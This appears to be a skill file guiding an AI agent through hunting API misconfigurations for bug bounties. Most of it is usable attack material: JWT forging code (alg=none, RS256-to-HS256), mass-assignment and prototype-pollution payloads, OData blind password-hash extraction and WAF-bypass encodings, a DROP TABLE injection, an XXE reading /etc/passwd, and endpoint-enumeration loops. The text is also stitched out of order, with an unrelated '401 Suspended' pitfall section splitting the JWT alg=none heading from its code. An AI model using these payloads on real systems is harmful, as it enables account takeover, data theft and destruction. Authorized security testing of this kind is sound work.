---
name: hunt-api-misconfig
description: "Hunt API security misconfiguration — mass assignment, JWT attacks, prototype pollution, HTTP verb tampering. Mass assignment: send {is_admin:true, role:admin, verified:true} on profile/account/reset endpoints — server blindly applies. JWT: alg=none, weak HMAC bruteforce, kid path traversal, JWK injection, token confusion. Prototype pollution: __proto__ injection in JSON merge / Object.assign / lodash _.merge → polluted prototype reaches sink (RCE in Node, XSS in browser). HTTP verb: GET-bypass-CSRF, X-HTTP-Method-Override, TRACE enabled. Detection: API responses with extra fields, JWTs in headers (decode at jwt.io). CORS misconfiguration (reflect-any-origin, null origin, subdomain-regex bypass, postMessage) is owned by hunt-cors. Use when hunting API misconfigs, JWT flaws, mass-assignment, prototype pollution."
---

## 12. API SECURITY MISCONFIGURATION

### Mass Assignment
```javascript
User.update(req.body)  // body has {"role": "admin"} → privilege escalation
```

### JWT None Algorithm

### Pitfall — "401 Suspended / Throttled" = Auth PASSED (not rejected)

When testing third-party API credentials (Stream.io, Twilio, AWS, GCP,
Stripe), a `401`/`403` response that names an internal API method
(`QueryCalls`, `GetCall`, `GetOrCreateCall`, `CreateDevice`) or contains
"Suspended" / "Throttled" / "Quota exceeded" means **the credentials were
ACCEPTED** and the request reached business logic. The error is about the
account status, not the auth token. A real auth rejection would say
"Unauthorized" / "Invalid token" / "Missing credentials" WITHOUT naming
the internal method.

**Rule:** Before concluding a JWT or API key is invalid, inspect the 401/403
response body for:
1. Internal API method names → auth passed, account-level error
2. "Suspended" / "Throttled" / "Quota" → auth passed, account-level error
3. "Contact us" link → auth passed, account-level error
4. Generic "Unauthorized" with no method name → auth actually rejected

This applies to ANY provider API (not just video SDKs) — the pattern is
universal across SaaS platforms that expose status-level errors via 401.
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": 1, "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # no signature
```

### JWT RS256 → HS256 Algorithm Confusion
```python
# Get server's public key from /.well-known/jwks.json
# Sign token with public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
# Server uses RS256 key as HS256 secret → accepts it
```

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

### CORS Exploitation
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses
```

---

## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)

OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.

### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`

```
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
```

Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))

### Attack class 2 — `$orderby` / `$select` column-disclosure bypass

```
GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
```

`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.

### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations

```
POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
--batch_1
Content-Type: application/http
GET Users?$filter=1 eq 1 HTTP/1.1
--batch_1--
```

WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.

### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass

```
GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
GET /api?%2524filter=...                                # double-encoded
GET /Users(1)/$value                                    # path-segment style
```

Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))

### Attack class 5 — OData → real SQLi when library passes filter raw

```
$filter=Name eq 'x'); DROP TABLE Users--'
```

Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).

### Bonus — `$expand` navigation-property IDOR

```
GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
```

Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).

### Detection heuristics

- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.

---

## API proxy / version-prefix discovery from uniform 400s

When a Next.js/SPA has a visible `/api/:path*` rewrite but every guessed `/api/foo` endpoint returns a uniform JSON `400 Bad request`, do not stop at `/api/*`. Many deployments front a versioned backend where the UI or proxy expects `/v1`, `/v2`, etc., and the unversioned paths all hit the same router fallback. Immediately retry discovered JS endpoints under common version prefixes:

```bash
# If /api/user/me returns 400, try /api/v1/user/me, /api/v2/user/me, etc.
for v in v1 v2 v3; do
  for ep in /auth/login/sso/info /user/me /user/list /document/submission/list /health /healthz; do
    echo "=== /api/$v$ep ==="
    curl -sk -i "https://$TARGET/api/$v$ep" | head -20
  done
done
```

Useful differentials:
- `400 Bad request` on `/api/user/me` but `401 JWT token not found` on `/api/v1/user/me` means `/api/v1` is the real protected API surface.
- `200` on `/api/v1/auth/login/sso/info` or similar config endpoints can leak IdP tenant/client IDs, scopes, state/nonce mechanics, and OAuth mode.
- `200` on `/api/v1/health` / `/healthz` fingerprints the backend router and confirms version prefix.

Also capture Envoy/Kubernetes routing headers while probing; they often disclose internal service names that help chain SSRF/request-routing bugs:

```bash
curl -skI "https://$TARGET/api/v1/user/me" | grep -iE 'x-envoy|decorator|upstream'
# Example: x-envoy-decorator-operation: api-service.namespace.svc.cluster.local:80/*
```

Treat `tenant_id` / OAuth `client_id` and internal service names as **recon leads**, not automatic High findings. Escalate only if they enable token confusion, redirect_uri abuse, SSRF to internal services, or unauthenticated sensitive API access.

---

## NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)

NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.

### Default discovery paths (cross-references `web2-recon`)

```
# NSwag / Swashbuckle (ASP.NET Core)
/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json

# Generic OpenAPI
/openapi, /openapi.json, /openapi.yaml, /.well-known/openapi.json

# Java / Spring (Springfox / springdoc)
/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources

# Python (FastAPI / Connexion)
/docs, /redoc, /openapi.json

# Quarkus
/q/openapi, /q/swagger-ui

# GraphQL adjacent
/graphql, /graphiql, /playground, /altair, /voyager
```

Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.

### Attack chains

**A. Spec disclosure → mass IDOR / BOLA.** Spec lists every `GET /api/v1/users/{userId}/...`. `jq '.paths | keys' swagger.json` → swap `{userId}` for victim's ID via Autorize/`ffuf -mc 200`. Common case: spec leaks `/api/admin/users/{id}/reset-password` documented but missing `[Authorize(Roles="Admin")]` on the controller — low-priv ATO.

**B. Spec disclosure → mass-assignment payload construction.** `components.schemas.UserUpdateDto` enumerates every model field including `isAdmin`, `emailVerified`, `tenantId`, `role`. Attacker copies the schema verbatim into `PATCH /users/me` and adds the privileged fields. Server's `[FromBody]` binder accepts them when DTOs aren't split into read-vs-write models.

**C. Hidden endpoints.** Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes that no front-end UI references. Reachable but uncovered by WAF rules and often skipped during auth reviews.

**D. Swagger UI configUrl takeover.** Swagger UI loads its config from `?configUrl=`. If unsanitised, attacker hosts an evil OpenAPI spec, sends victim a link to the *legitimate* Swagger UI with `?configUrl=https://evil/spec.json`. Spec routes point back at the legitimate origin so the victim's "Try It Out" clicks fire same-origin authenticated requests. ([HackerOne #3124103 — U.S. DoD Swagger UI Injection, May 2025](https://hackerone.com/reports/3124103))

### Disclosed cases

- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.

### Detection checklist

1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.

### Environment-variant OpenAPI enumeration

When `/openapi.json` is found on an auth-service or API host, enumerate ALL
environment variants of that host. Organizations often deploy identical
services across prod/dev/stg/disposable with the same spec exposed on each.
The spec reveals admin endpoints, internal paths, grant types, and service
names — useful even when the endpoints themselves are protected by IAP or
JWT.

```bash
# After finding /openapi.json on p2-auth.example.com, probe variants:
for host in p2-auth p2-auth-dev p2-auth-stg p2-auth-disposable \
           gcpglo-p2-auth gcpglo-p2-auth-stg; do
  echo "--- $host ---"
  curl -sk -o /dev/null -w "%{http_code} %{size_download} bytes\n" \
    "https://${host}.example.com/openapi.json"
done
```

Also fetch `/.well-known/jwks.json` on each variant. The `kid` (key ID)
field often contains the **environment name + date** (e.g.
`portal-auth-prod-2026-08-04`, `portal-auth-dev-2026-08-05`), which:
- Confirms the environment name and deployment date
- Reveals the key rotation schedule
- If the same RSA `n` value is shared across environments, confirms key
  reuse across prod/dev/stg — a configuration weakness

---

## Azure API Management public-client subscription keys

Modern SPAs and mobile apps often call Azure API Management (APIM) with `Ocp-Apim-Subscription-Key` embedded in public JavaScript or app binaries. Treat this as an **API-boundary lead**, not automatically as a high-severity secret leak: many teams intentionally use APIM subscription keys as client identifiers while relying on JWT/session auth for sensitive operations.

### Detection

Search public bundles and APK strings for:

```bash
grep -RIn "Ocp-Apim-Subscription-Key\|gatewaySubscriptionKey\|subscriptionKey\|apim" .
grep -RohE '(?<![a-f0-9])[a-f0-9]{32}(?![a-f0-9])' . | sort -u
```

Common frontend pattern:

```js
axios.create({
  baseURL: config.services.gatewayUrl,
  headers: {
    "Ocp-Apim-Subscription-Key": config.services.gatewaySubscriptionKey,
    "Content-Type": "application/json"
  }
})
```

### Safe validation workflow

1. Pick a **read-only, non-customer** endpoint discovered from the same bundle, e.g. restaurant/menu/status metadata.
2. Request it **without** the key and record the APIM error (`401 missing subscription key`).
3. Request the same endpoint **with** the public key and record whether it returns data.
4. Check sensitive endpoints (`customer`, `wallet`, `loyalty`, `order`) only with low-rate probes; stop on `429` or bot-protection headers.
5. Do not report the key alone as High/Critical unless it grants customer data, payment data, state-changing operations, or a chain to auth bypass/IDOR/business logic.

Example evidence shape:

```bash
curl -sk https://target.example/api/public/resource
# 401 missing subscription key

curl -sk -H 'Ocp-Apim-Subscription-Key: <REDACTED>' \
  https://target.example/api/public/resource
# 200 read-only metadata
```

### Severity rubric

| Result | Severity guidance |
|---|---|
| Key only unlocks public/menu/status metadata | Informational/Low red-team observation |
| Key enables direct scripting of non-sensitive public APIs outside browser | Low/Medium, useful chain lead |
| Key + no JWT returns customer/loyalty/payment/order data | High |
| Key allows state-changing operations without user auth | High/Critical depending on impact |
| Key works across non-prod/staging APIs with weaker data controls | Medium→High depending on data |

### Pitfalls

- Public web keys are often **not secrets**; frame as “APIM product boundary relies on public client key; authorization still needs per-endpoint validation.”
- Browser bot protection (`x-kpsdk-*`, Kasada-style `429`) is a signal to slow down or switch to normal browser flow, not to brute force retries.
- If a hardcoded bypass/debug header is found, validate it once on a harmless read-only endpoint before drawing conclusions; absence of APIM bypass on one endpoint should be recorded as a negative, not generalized too broadly.
- Always redact full subscription keys in reports; include only prefix/suffix or a hash.

## Related Skills & Chains

- **`hunt-nextjs`** — Third-party video SDK (Stream.io/Twilio/Daily.co) token endpoints generate JWTs for any userId without auth. Chain primitive: `/create-token?userId={any}` + hardcoded API key → join any telemedicine call. See `hunt-nextjs` Phase 9 and `references/video-sdk-jwt-exploit.md` for full recipe.
- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.

